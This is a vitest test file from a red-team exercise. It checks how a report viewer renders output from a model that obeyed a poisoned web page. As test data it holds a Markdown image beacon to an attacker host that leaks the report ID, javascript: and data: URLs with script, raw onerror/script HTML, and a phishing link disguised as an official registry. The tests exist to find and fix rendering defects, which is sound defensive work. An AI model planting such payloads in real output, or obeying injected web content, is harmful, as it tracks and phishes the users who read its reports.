/**
 * Red team, surface C, attacker lens — what a poisoned REPORT does on the buyer's
 * screen (`docs/plans/m-red-team.md § C`).
 *
 * The harness (`packages/core/test/red-team-harness.test.ts`) proves that an
 * obeyed page reaches `findings`, `recommendation`, `sources` and the progress
 * line verbatim: the schema constrains SHAPE, not values. This file takes those
 * exact values and renders them the way `JobView`/`ReadReport` do, and asks what
 * the DOM contains — an `<img>` that fires on open, an `<a href="javascript:">`
 * labelled "source", a search-result title rendered as Markdown.
 *
 * Tests marked `it.fails` DEMONSTRATE A DEFECT: the assertion is the behaviour we
 * want, and it is red against today's code. When the renderer is fixed they will
 * start passing, vitest will report them as unexpected passes, and whoever fixes it
 * flips them to `it`. Every one first asserts that the render itself worked, so an
 * `it.fails` cannot be satisfied by a crash.
 */
import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { ReportViewer } from '../src/components/ReportViewer';

// The exact strings the obedient model writes (poisoned-web.ts: image-beacon, js-url).
const BEACON = 'https://beacon.attacker.test/p.gif?ref=PZ-IMG&report=REPORT-ID';
const IMG_MD = `![Bubbles Express verified photo](${BEACON})`;
const JS_URL = 'javascript:void(document.title="PZ-JS")';
const DATA_URL = 'data:text/html,<script>document.title="PZ-DATA"</script>';

// The Florida cover — the shape that makes `SectionBody` draw DealCards.
const cover = {
  from: ['shortlist', 'deep_dives'],
  nameKey: 'business',
  figures: [{ labelKey: 'targets', agg: 'count' as const }],
  tiles: [{ labelKey: 'asking', field: 'askingPrice' }],
};

describe('C-attack · Markdown images are a tracking beacon in the buyer’s report', () => {
  // The red-team model's `findings.overview` and `risks[]` — both go through
  // react-markdown with only `a` overridden (ReportViewer.tsx:115).
  const report = {
    findings: {
      overview: `Two laundromats match. ${IMG_MD}`,
      listings: [{ business: 'Bubbles Express', askingPrice: 365000, sourceUrl: 'https://attacker.test/listing/bubbles-express' }],
      risks: [`Lease expires 2027. ${IMG_MD}`],
    },
    recommendation: { nextStep: `Call the broker. ${IMG_MD}` },
  };
  const sections = [
    { key: 'findings', title: 'Findings' },
    { key: 'recommendation', title: 'Recommendation' },
  ];

  it('FIXED · overview / risks / nextStep: no <img> renders — before the fix, 3 did, one GET per open from the buyer’s IP (mutation: drop `img` from `MD`)', () => {
    const { container } = render(<ReportViewer report={report} sections={sections} meta={{}} lang="en" />);
    // The render worked — the honest half of the sentence is on screen…
    expect(screen.getByText(/Two laundromats match/)).toBeTruthy();
    // …and so is the beacon. `img` is react-markdown's default element; the
    // default `urlTransform` allows `https:` for `src` exactly as it does for `href`.
    const imgs = Array.from(container.querySelectorAll('img'));
    // Measured before the fix: 3 (overview, risks[0], nextStep), every src === BEACON.
    expect(imgs.map((i) => i.getAttribute('src'))).toEqual([]);
    expect(container.innerHTML).not.toContain('beacon.attacker.test');
  });

  it('FIXED · a DealCard prose field (Florida `deep_dives[].overview`) renders no <img> either', () => {
    const { container } = render(
      <ReportViewer
        report={{ deep_dives: [{ business: 'Bubbles Express', askingPrice: 365000, overview: `Absentee-run. ${IMG_MD}`, sourceUrl: 'https://x.test' }] }}
        sections={[{ key: 'deep_dives', title: 'Deep dives' }]}
        meta={{}}
        lang="en"
        cover={cover}
      />,
    );
    expect(screen.getByText(/Absentee-run/)).toBeTruthy();
    // Measured before the fix: one <img>, src === BEACON, inside `.rv-deal .prose`.
    expect(Array.from(container.querySelectorAll('.rv-deal img')).map((i) => i.getAttribute('src'))).toEqual([]);
  });
});

describe('C-attack · raw HTML in prose', () => {
  it('SOUND · <img onerror> / <script> typed as HTML in a prose field is text, not DOM (react-markdown without rehype-raw)', () => {
    // Mutation that reds it: add `rehypePlugins={[rehypeRaw]}` to <Markdown> in `Prose`.
    const { container } = render(
      <ReportViewer
        report={{ findings: { overview: 'Two match. <img src="x" onerror="document.title=1"><script>document.title=2</script>' } }}
        sections={[{ key: 'findings', title: 'Findings' }]}
        meta={{}}
        lang="en"
      />,
    );
    expect(screen.getByText(/Two match\./)).toBeTruthy();
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
    expect(document.title).not.toMatch(/^[12]$/);
  });
});

describe('C-attack · raw hrefs with no protocol allowlist', () => {
  it.fails('DEFECT · DealCard `sourceUrl` = javascript: becomes <a href="javascript:…">source ↗</a> (ReportViewer.tsx:220)', () => {
    render(
      <ReportViewer
        report={{ shortlist: [{ business: 'Coral Clean', askingPrice: 410000, sourceUrl: JS_URL }] }}
        sections={[{ key: 'shortlist', title: 'Shortlist' }]}
        meta={{}}
        lang="en"
        cover={cover}
      />,
    );
    expect(screen.getByText('Coral Clean')).toBeTruthy();
    const a = screen.getByText(/source ↗/).closest('a')!;
    // What a buyer clicks: the "source ↗" link under the deal card.
    // Measured today: href === 'javascript:void(document.title="PZ-JS")'.
    expect(a.getAttribute('href')).not.toMatch(/^\s*javascript:/i);
  });

  it.fails('DEFECT · Sources list `items[].url` (search-result URL) = data:/javascript: becomes the ↗ link (ReportViewer.tsx:230)', () => {
    const { container } = render(
      <ReportViewer
        report={{ sources: { items: [{ id: 1, url: JS_URL, label: 'Coral Clean listing' }, { id: 2, url: DATA_URL, label: 'Registry' }] } }}
        sections={[{ key: 'sources', title: 'Sources' }]}
        meta={{}}
        lang="en"
      />,
    );
    const hrefs = Array.from(container.querySelectorAll('ul.rv-sources a')).map((a) => a.getAttribute('href'));
    expect(hrefs).toHaveLength(2); // the render worked
    // Measured today: ['javascript:void(document.title="PZ-JS")', 'data:text/html,<script>…</script>'].
    expect(hrefs.filter((h) => /^\s*(javascript|data|vbscript):/i.test(h ?? ''))).toEqual([]);
  });

  it.fails('DEFECT · community mention `m.url` = javascript: becomes the "↗ source" link (ReportViewer.tsx:321)', () => {
    render(
      <ReportViewer
        report={{ community: { overview: 'Mixed.', mentions: [{ platform: 'Reddit', url: JS_URL, topic: 'Wash World', summary: 'Owner is responsive.', sentiment: 'positive' }] } }}
        sections={[{ key: 'community', title: 'Community' }]}
        meta={{}}
        lang="en"
      />,
    );
    const a = screen.getByText(/↗ source/).closest('a')!;
    expect(a.getAttribute('href')).not.toMatch(/^\s*javascript:/i);
  });

  it('SOUND · a javascript: link inside prose is neutralised by react-markdown’s default urlTransform (href="")', () => {
    // Pins the library default. Mutation that reds it: pass `urlTransform={(u) => u}`
    // to <Markdown> in `Prose` — the href comes back as the javascript: URL.
    render(
      <ReportViewer
        report={{ findings: { overview: `See [the canonical listing](${JS_URL}) for details.` } }}
        sections={[{ key: 'findings', title: 'Findings' }]}
        meta={{}}
        lang="en"
      />,
    );
    const a = screen.getByText('the canonical listing').closest('a')!;
    expect(a.getAttribute('href') ?? '').not.toMatch(/javascript:/i);
  });
});

describe('C-attack · the derived sources section', () => {
  it('SOUND (Florida shape) · `items[].label` is text: Markdown in a search-result title does not render', () => {
    // A page titled with a Markdown link — `SourceList` prints `s.label` as text,
    // so the buyer sees the brackets, not a second link. Mutation that reds it:
    // wrap `{s.label || s.url}` in <Markdown>.
    const { container } = render(
      <ReportViewer
        report={{ sources: { items: [{ id: 1, url: 'https://attacker.test/registry', label: '[Official registry](https://phish.attacker.test) (PZ-SRC)' }] } }}
        sections={[{ key: 'sources', title: 'Sources' }]}
        meta={{}}
        lang="en"
      />,
    );
    expect(container.querySelectorAll('ul.rv-sources a')).toHaveLength(1);
    expect(container.querySelector('a[href="https://phish.attacker.test"]')).toBeNull();
    expect(screen.getByText(/\[Official registry\]/)).toBeTruthy();
  });

  it.fails('DEFECT (generic shape) · a sources section that is an array of {title,url} renders the TITLE as Markdown — a search-result title becomes a link and an image', () => {
    // The red-team model derives `sources` as `[{title,url}]` (no `items`), so
    // `isSourceList` does not match, `Value` falls to ObjectFields, and every
    // string — the attacker's page TITLE included — goes through <Prose>.
    const { container } = render(
      <ReportViewer
        report={{ sources: [{ title: `[Florida DBPR — Official Registry](https://phish.attacker.test) ${IMG_MD}`, url: 'https://attacker.test/registry' }] }}
        sections={[{ key: 'sources', title: 'Sources' }]}
        meta={{}}
        lang="en"
      />,
    );
    expect(screen.getByText('Florida DBPR — Official Registry')).toBeTruthy(); // rendered
    // Measured today: 1 <a href="https://phish.attacker.test"> and 1 <img src=BEACON>.
    expect(container.querySelector('a[href="https://phish.attacker.test"]')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
  });
});
